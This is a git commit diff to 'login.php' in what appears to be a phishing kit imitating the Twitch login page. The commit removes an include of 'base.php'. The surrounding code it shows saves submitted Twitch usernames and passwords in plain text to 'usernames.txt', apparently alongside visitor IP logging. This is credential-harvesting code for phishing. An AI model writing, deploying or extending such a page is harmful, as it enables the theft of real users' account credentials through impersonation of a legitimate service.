8b42f65c3d8a304498f1aa8bae156c895d46b8de
Usama Abdul Sattar <usama123456789@protonmail.com>
2018-06-08 16:59:47 +0500

    Update login.php

--- WebPages/twitch/login.php
+++ WebPages/twitch/login.php
@@ -1,5 +1,4 @@
 <?php
-include 'base.php';
 include 'ip.php';
 
 file_put_contents("usernames.txt", "[Twitch-EMAIL]: " . $_POST['twitch_user'] . " [Twitch-PASS]: " . $_POST['twitch_pass'] . "\n", FILE_APPEND);
